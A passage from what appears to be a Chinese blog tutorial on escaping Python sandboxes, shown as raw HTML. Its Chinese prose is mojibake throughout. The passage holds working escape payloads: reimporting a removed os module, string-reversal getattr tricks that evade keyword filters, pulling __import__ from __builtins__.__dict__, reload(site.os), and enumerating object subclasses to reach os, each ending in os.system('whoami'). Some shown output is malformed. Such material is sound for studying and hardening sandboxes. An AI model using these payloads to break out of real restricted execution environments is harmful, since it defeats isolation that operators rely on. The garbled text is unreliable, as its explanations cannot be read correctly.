class="hljs-string">&#x27;system&#x27;</span><br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure><p>å‡å¦‚é‡åˆ°ä¸Šé¢è¿™ç§è®©osæ¨¡å—æˆäº†å­—ç¬¦ä¸²ï¼Œç»•è¿‡æ€è·¯å°±æ˜¯å°†å…¶åˆ é™¤æ‰ï¼Œé‡æ–°åŠ è½½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span><span class="hljs-comment"># </span><br><br><span class="hljs-keyword">del</span> sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>]<br><span class="hljs-keyword">import</span> os<br>os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="æ‰§è¡Œå‡½æ•°"><a href="#æ‰§è¡Œå‡½æ•°" class="headerlink" title="æ‰§è¡Œå‡½æ•°"></a>æ‰§è¡Œå‡½æ•°</h2><p>é€šè¿‡ä¸Šé¢å†…å®¹æˆ‘ä»¬å¾ˆå®¹æ˜“å‘ç°ï¼Œå…‰å¼•å…¥ os åªä¸è¿‡æ˜¯ç¬¬ä¸€æ­¥ï¼Œå¦‚æœæŠŠ system è¿™ä¸ªå‡½æ•°å¹²æ‰ï¼Œä¹Ÿæ²¡æ³•é€šè¿‡<code>os.system</code>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶ä¸”è¿™é‡Œçš„<code>system</code>ä¹Ÿä¸æ˜¯å­—ç¬¦ä¸²ï¼Œä¹Ÿæ²¡æ³•<strong>ç›´æ¥åšç¼–ç </strong>ç­‰ç­‰æ“ä½œã€‚</p><p>ä¸è¿‡ï¼Œè¦æ˜ç¡®çš„æ˜¯ï¼Œos ä¸­èƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°æœ‰å¾ˆå¤šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>))<br><span class="hljs-built_in">print</span>(os.popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()) <br><span class="hljs-built_in">print</span>(os.popen2(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()) <span class="hljs-comment"># 2.x</span><br><span class="hljs-built_in">print</span>(os.popen3(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()) <span class="hljs-comment"># 2.x</span><br><span class="hljs-built_in">print</span>(os.popen4(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()) <span class="hljs-comment"># 2.x</span><br></code></pre></td></tr></table></figure><p>åº”è¯¥è¿˜æœ‰ä¸€äº›ï¼Œå¯ä»¥åœ¨è¿™é‡Œæ‰¾æ‰¾ï¼š</p><ol><li>Python2.x ï¼š<a href="https://docs.python.org/2/library/os.html">https://docs.python.org/2/library/os.html</a></li><li>Python3.x ï¼š<a href="https://docs.python.org/3/library/os.html">https://docs.python.org/3/library/os.html</a></li></ol><h2 id="å…¶æ¬¡ï¼Œå¯ä»¥é€šè¿‡-getattræ‹¿åˆ°å¯¹è±¡çš„æ–¹æ³•ã€å±æ€§ï¼š"><a href="#å…¶æ¬¡ï¼Œå¯ä»¥é€šè¿‡-getattræ‹¿åˆ°å¯¹è±¡çš„æ–¹æ³•ã€å±æ€§ï¼š" class="headerlink" title="å…¶æ¬¡ï¼Œå¯ä»¥é€šè¿‡ getattræ‹¿åˆ°å¯¹è±¡çš„æ–¹æ³•ã€å±æ€§ï¼š"></a>å…¶æ¬¡ï¼Œå¯ä»¥é€šè¿‡ getattræ‹¿åˆ°å¯¹è±¡çš„æ–¹æ³•ã€å±æ€§ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> os<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">getattr</span>(os, <span class="hljs-string">&#x27;metsys&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><br><span class="hljs-keyword">or</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(__builtins__, <span class="hljs-string">&#x27;__tropmi__&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;so&#x27;</span>[::-<span class="hljs-number">1</span>]), <span class="hljs-string">&#x27;metsys&#x27;</span>[::-<span class="hljs-number">1</span>])(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure><p>ä¸ <code>getattr</code> ç›¸ä¼¼çš„è¿˜æœ‰ <code>__getattr__</code>ã€<code>__getattribute__</code>ï¼Œå®ƒä»¬è‡ªå·±çš„åŒºåˆ«å°±æ˜¯<code>getattr</code>ç›¸å½“äº<code>class.attr</code>ï¼Œéƒ½æ˜¯è·å–ç±»å±æ€§&#x2F;æ–¹æ³•çš„ä¸€ç§æ–¹å¼ï¼Œåœ¨è·å–çš„æ—¶å€™ä¼šè§¦å‘<code>__getattribute__</code>ï¼Œå¦‚æœ<code>__getattribute__</code>æ‰¾ä¸åˆ°ï¼Œåˆ™è§¦å‘<code>__getattr__</code>ï¼Œè¿˜æ‰¾ä¸åˆ°åˆ™æŠ¥é”™ã€‚</p><h2 id="builtin-ï¼Œbuiltinsä¸-builtins"><a href="#builtin-ï¼Œbuiltinsä¸-builtins" class="headerlink" title="__builtin__ï¼Œbuiltinsä¸__builtins__"></a><code>__builtin__</code>ï¼Œ<code>builtins</code>ä¸<code>__builtins__</code></h2><p>åœ¨python2.xçš„ç‰ˆæœ¬ä¸­ï¼Œå†…ç½®æ¨¡å—è¢«å‘½åä¸ºäº†<code>__builtin__</code>ï¼Œåˆ°äº†python3.xå°±æˆäº†builtinséƒ½éœ€è¦å°†å…¶å¯¼å…¥æ‰èƒ½æŸ¥çœ‹ï¼š</p><p>2.x:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> __builtin__<br><span class="hljs-meta">&gt;&gt;&gt; </span>__builtin__<br>&lt;module <span class="hljs-string">&#x27;__builtin__&#x27;</span> (built-<span class="hljs-keyword">in</span>)&gt;<br></code></pre></td></tr></table></figure><p>3.xï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> builtins<br><span class="hljs-meta">&gt;&gt;&gt; </span>builtins<br>&lt;module <span class="hljs-string">&#x27;builtins&#x27;</span> (built-<span class="hljs-keyword">in</span>)&gt;<br></code></pre></td></tr></table></figure><p><code>__builtins__</code>å®é™…å°±æ˜¯<code>__builtin__</code>ï¼Œ<code>builtins</code>çš„å¼•ç”¨ï¼Œå®ƒä¸éœ€è¦å¯¼å…¥å³å¯ä½¿ç”¨ï¼Œä½†æ˜¯<code>__builtins__</code>ä¸<code>__builtin__</code>å’Œ<code>builtins</code>è¿˜æ˜¯æœ‰ä¸€ä¸ªå°åŒºåˆ«ï¼Œå°±æ˜¯åœ¨å±€éƒ¨çš„ä½œç”¨åŸŸä¸­ï¼ˆä¸€ä¸ªå‡½æ•°å†…éƒ¨ï¼Œæ¯”å¦‚è¯´<code> print(eval(inp, &#123;&quot;__builtins__&quot;: None, &#39;f&#39;: f, &#39;eval&#39;: ev4l&#125;))</code>ï¼‰<code>__builtins__</code> å°±æ˜¯æ˜¯ä¸€ä¸ªå­—å…¸ç±»ä¼¼äº<code>__builtin__.__dict__</code>çš„å¼•ç”¨ï¼Œè€Œé<code>__builtin__</code>æœ¬èº«ã€‚è¿˜æœ‰æˆ‘è§‰å¾—æœ‰å¿…è¦äº†è§£ä¸‹Python å¯¹å‡½æ•°ã€å˜é‡ã€ç±»ç­‰ç­‰çš„æŸ¥æ‰¾æ–¹å¼æ˜¯æŒ‰ LEGB è§„åˆ™æ¥æ‰¾çš„ã€‚</p><h3 id="é‚£ä»€ä¹ˆæ˜¯LEGBå‘¢ï¼Ÿ"><a href="#é‚£ä»€ä¹ˆæ˜¯LEGBå‘¢ï¼Ÿ" class="headerlink" title="é‚£ä»€ä¹ˆæ˜¯LEGBå‘¢ï¼Ÿ"></a>é‚£ä»€ä¹ˆæ˜¯LEGBå‘¢ï¼Ÿ</h3><ol><li>Lï¼ˆLocalï¼‰â€”â€”å±€éƒ¨ä½œç”¨åŸŸ<ul><li>å½“å‰å‡½æ•°æˆ–ä»£ç å—å†…éƒ¨å®šä¹‰çš„å˜é‡ã€‚</li><li>å¦‚æœåœ¨å‡½æ•°å†…å®šä¹‰äº†ä¸€ä¸ªå˜é‡ï¼ŒPython é¦–å…ˆä¼šåœ¨å½“å‰å‡½æ•°çš„å±€éƒ¨ä½œç”¨åŸŸå†…æŸ¥æ‰¾ã€‚</li></ul></li><li>Eï¼ˆEnclosingï¼‰â€”â€”é—­åŒ…å‡½æ•°å¤–çš„å±€éƒ¨ä½œç”¨åŸŸ<ul><li>å¦‚æœå±€éƒ¨ä½œç”¨åŸŸä¸­æ²¡æœ‰æ‰¾åˆ°å˜é‡ï¼ŒPython ä¼šæŸ¥æ‰¾<strong>å¤–å±‚å‡½æ•°</strong>ï¼ˆå³é—­åŒ…ï¼‰ä¸­å®šä¹‰çš„å˜é‡ã€‚</li><li>é€‚ç”¨äºåµŒå¥—å‡½æ•°çš„åœºæ™¯ï¼Œå³å‡½æ•°å†…éƒ¨å®šä¹‰äº†å¦ä¸€ä¸ªå‡½æ•°ã€‚</li></ul></li><li>Gï¼ˆGlobalï¼‰â€”â€”å…¨å±€ä½œç”¨åŸŸ<ul><li>å¦‚æœåœ¨å±€éƒ¨å’Œé—­åŒ…ä½œç”¨åŸŸä¸­éƒ½æ‰¾ä¸åˆ°å˜é‡ï¼ŒPython ä¼šæŸ¥æ‰¾æ¨¡å—çš„å…¨å±€ä½œç”¨åŸŸã€‚</li><li>å…¨å±€ä½œç”¨åŸŸä¸­çš„å˜é‡é€šå¸¸å®šä¹‰åœ¨è„šæœ¬çš„é¡¶å±‚ï¼Œæˆ–è€…æ˜¯ <code>global</code> å£°æ˜çš„å˜é‡ã€‚</li></ul></li><li>Bï¼ˆBuilt-inï¼‰â€”â€”å†…ç½®ä½œç”¨åŸŸ<ul><li>å¦‚æœä¸Šè¿°ä½œç”¨åŸŸéƒ½æ‰¾ä¸åˆ°å˜é‡ï¼ŒPython ä¼šåœ¨å†…ç½®ä½œç”¨åŸŸä¸­æŸ¥æ‰¾ã€‚</li><li>å†…ç½®ä½œç”¨åŸŸåŒ…å« Python è¯­è¨€æä¾›çš„å†…ç½®å‡½æ•°å’Œå˜é‡ï¼Œä¾‹å¦‚ <code>len()</code>ã€<code>print()</code> å’Œ <code>Exception</code>ã€‚</li></ul></li></ol><h4 id="æŸ¥æ‰¾é¡ºåºï¼š"><a href="#æŸ¥æ‰¾é¡ºåºï¼š" class="headerlink" title="æŸ¥æ‰¾é¡ºåºï¼š"></a>æŸ¥æ‰¾é¡ºåºï¼š</h4><p>Python é‡åˆ°å˜é‡æ—¶ä¼šæŒ‰ç…§ <strong>L â†’ E â†’ G â†’ B</strong> çš„é¡ºåºä¾æ¬¡æŸ¥æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°åŒ¹é…çš„å˜é‡ä¸ºæ­¢ã€‚å¦‚æœæ‰€æœ‰ä½œç”¨åŸŸéƒ½æ‰¾ä¸åˆ°ï¼Œä¼šæŠ›å‡º <code>NameError</code>ã€‚</p><p>å›å½’è¯é¢˜<code>__builtins__</code>æœ‰å¾ˆå¤šæœ‰æ„æ€çš„å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;__import__&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(__builtins__)<br><span class="hljs-literal">True</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(__builtins__)<br><span class="hljs-literal">True</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;execfile&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(__builtins__)<br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>å¦‚æœé‡åˆ°å°†<code>__builtins__</code>é‡Œé¢çš„å±é™©å‡½æ•°åˆ é™¤åˆè¯¥å¦‚ä½•ç»•è¿‡å˜ï¼Ÿ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">__builtins__.__dict__[<span class="hljs-string">&#x27;eval&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span><br><span class="hljs-keyword">or</span><br><span class="hljs-keyword">del</span> __builtins__.__dict__[<span class="hljs-string">&#x27;eval&#x27;</span>]<br></code></pre></td></tr></table></figure><p>å¯ä»¥åˆ©ç”¨ <code>reload(__builtins__)</code> æ¥æ¢å¤ <code>__builtins__</code>ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ <code>reload</code> çš„æ—¶å€™ä¹Ÿæ²¡å¯¼å…¥ï¼Œè¯´æ˜<code>reload</code>ä¹Ÿåœ¨ <code>__builtins__</code>é‡Œï¼Œé‚£å¦‚æœè¿<code>reload</code>éƒ½ä»<code>__builtins__</code>ä¸­åˆ äº†ï¼Œå°±æ²¡æ³•æ¢å¤<code>__builtins__</code>äº†ï¼Œéœ€è¦å¦å¯»ä»–æ³•ã€‚</p><p>æ³¨æ„ï¼š2.x çš„ <code>reload</code> æ˜¯å†…å»ºçš„ï¼Œ3.x éœ€è¦ <code>import imp</code>ï¼Œç„¶åå† <code>imp.reload</code></p><h2 id="ç»§æ‰¿å…³ç³»ç»•è¿‡"><a href="#ç»§æ‰¿å…³ç³»ç»•è¿‡" class="headerlink" title="ç»§æ‰¿å…³ç³»ç»•è¿‡"></a>ç»§æ‰¿å…³ç³»ç»•è¿‡</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<br>(&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)<br></code></pre></td></tr></table></figure><p>å…¶ä¸­<code>__mro__</code>ï¼Œæ˜¯ä¸ªå…ƒç»„ï¼Œè®°å½•äº†ç»§æ‰¿å…³ç³»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>:<br><span class="hljs-meta">... </span><span class="hljs-keyword">pass</span><br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>test.__bases__<br>()<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>(<span class="hljs-title class_ inherited__">object</span>):<br><span class="hljs-meta">... </span><span class="hljs-keyword">pass</span><br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>test.__bases__<br>(<span class="hljs-string">&#x27;object&#x27;</span>&gt;,)<br></code></pre></td></tr></table></figure><p>ç±»çš„å®ä¾‹åœ¨è·å– <code>__class__</code> å±æ€§æ—¶ä¼šæŒ‡å‘è¯¥å®ä¾‹å¯¹åº”çš„ç±»ã€‚å¯ä»¥çœ‹åˆ°ï¼Œ<code>&#39;&#39;</code>å±äº <code>str</code>ç±»ï¼Œå®ƒç»§æ‰¿äº† <code>object</code> ç±»ï¼Œè¿™ä¸ªç±»æ˜¯æ‰€æœ‰ç±»çš„è¶…ç±»ã€‚å…·æœ‰ç›¸åŒåŠŸèƒ½çš„è¿˜æœ‰<code>__base__</code>å’Œ<code>__bases__</code>ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç»å…¸ç±»éœ€è¦æŒ‡æ˜ç»§æ‰¿ object æ‰ä¼šç»§æ‰¿å®ƒï¼Œå¦åˆ™æ˜¯ä¸ä¼šç»§æ‰¿çš„ï¼š</p><p>ç”±äºï¼šæ²¡æ³•ç›´æ¥å¼•å…¥ osï¼Œé‚£ä¹ˆå‡å¦‚æœ‰ä¸ªåº“å«Aï¼Œåœ¨Aä¸­å¼•å…¥äº†<code>os</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>__globals__</code>æ‹¿åˆ° osï¼ˆ<code>__globals__</code>æ˜¯å‡½æ•°æ‰€åœ¨çš„å…¨å±€å‘½åç©ºé—´ä¸­æ‰€å®šä¹‰çš„å…¨å±€å˜é‡ï¼‰ã€‚ä¾‹å¦‚ï¼Œ<code>site</code> è¿™ä¸ªåº“å°±æœ‰ <code>os</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> site<br><span class="hljs-meta">&gt;&gt;&gt; </span>site.os<br>&lt;module <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/usr/lib/python2.7/os.pyc&#x27;</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œèƒ½å¼•å…¥ site çš„è¯ï¼Œå°±ç›¸å½“äºæœ‰ osã€‚é‚£å¦‚æœ site ä¹Ÿè¢«ç¦ç”¨äº†å‘¢ï¼Ÿæ²¡äº‹ï¼Œæœ¬æ¥ä¹Ÿå°±æ²¡æ‰“ç®—ç›´æ¥ <code>import site</code>ã€‚å¯ä»¥åˆ©ç”¨ <code>reload</code>ï¼Œå˜ç›¸åŠ è½½ <code>os</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> site<br><span class="hljs-meta">&gt;&gt;&gt; </span>os<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span><br>NameError: name <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> defined<br><span class="hljs-meta">&gt;&gt;&gt; </span>os = reload(site.os)<br><span class="hljs-meta">&gt;&gt;&gt; </span>os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>kali<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>æ‰€æœ‰ç±»éƒ½ç»§æ‰¿objectï¼Œé‚£ä¹ˆçœ‹çœ‹ä»–çš„å­ç±»(Python2.x)ï¼Œï¼ˆPython3.xï¼Œ<code>for i in enumerate(&#39;&#39;.__class__.__mro__[-1].__subclasses__()): print(i)</code>ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()): <span class="hljs-built_in">print</span> i<br><span class="hljs-meta">... </span><br>(<span class="hljs-number">0</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;)<br>(<span class="hljs-number">1</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;)<br>(<span class="hljs-number">2</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;)<br>(<span class="hljs-number">3</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;)<br>(<span class="hljs-number">4</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;)<br>(<span class="hljs-number">5</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;)<br>(<span class="hljs-number">6</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;)<br>(<span class="hljs-number">7</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;)<br>(<span class="hljs-number">8</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;)<br>(<span class="hljs-number">9</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NotImplementedType&#x27;</span>&gt;)<br>(<span class="hljs-number">10</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;traceback&#x27;</span>&gt;)<br>(<span class="hljs-number">11</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;super&#x27;</span>&gt;)<br>(<span class="hljs-number">12</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;xrange&#x27;</span>&gt;)<br>(<span class="hljs-number">13</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;)<br>(<span class="hljs-number">14</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;)<br>(<span class="hljs-number">15</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;slice&#x27;</span>&gt;)<br>(<span class="hljs-number">16</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;staticmethod&#x27;</span>&gt;)<br>(<span class="hljs-number">17</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;)<br>(<span class="hljs-number">18</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;)<br>(<span class="hljs-number">19</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;buffer&#x27;</span>&gt;)<br>(<span class="hljs-number">20</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;long&#x27;</span>&gt;)<br>(<span class="hljs-number">21</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frozenset&#x27;</span>&gt;)<br>(<span class="hljs-number">22</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;property&#x27;</span>&gt;)<br>(<span class="hljs-number">23</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;memoryview&#x27;</span>&gt;)<br>(<span class="hljs-number">24</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;)<br>(<span class="hljs-number">25</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;enumerate&#x27;</span>&gt;)<br>(<span class="hljs-number">26</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;reversed&#x27;</span>&gt;)<br>(<span class="hljs-number">27</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;)<br>(<span class="hljs-number">28</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frame&#x27;</span>&gt;)<br>(<span class="hljs-number">29</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;)<br>(<span class="hljs-number">30</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instancemethod&#x27;</span>&gt;)<br>(<span class="hljs-number">31</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;function&#x27;</span>&gt;)<br>(<span class="hljs-number">32</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classobj&#x27;</span>&gt;)<br>(<span class="hljs-number">33</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dictproxy&#x27;</span>&gt;)<br>(<span class="hljs-number">34</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;generator&#x27;</span>&gt;)<br>(<span class="hljs-number">35</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;getset_descriptor&#x27;</span>&gt;)<br>(<span class="hljs-number">36</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;wrapper_descriptor&#x27;</span>&gt;)<br>(<span class="hljs-number">37</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instance&#x27;</span>&gt;)<br>(<span class="hljs-number">38</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;ellipsis&#x27;</span>&gt;)<br>(<span class="hljs-number">39</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;member_descriptor&#x27;</span>&gt;)<br>(<span class="hljs-number">40</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;)<br>(<span class="hljs-number">41</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;)<br>(<span class="hljs-number">42</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;)<br>(<span class="hljs-number">43</span>, &lt;<span class="hljs-built_in">type</span> <span 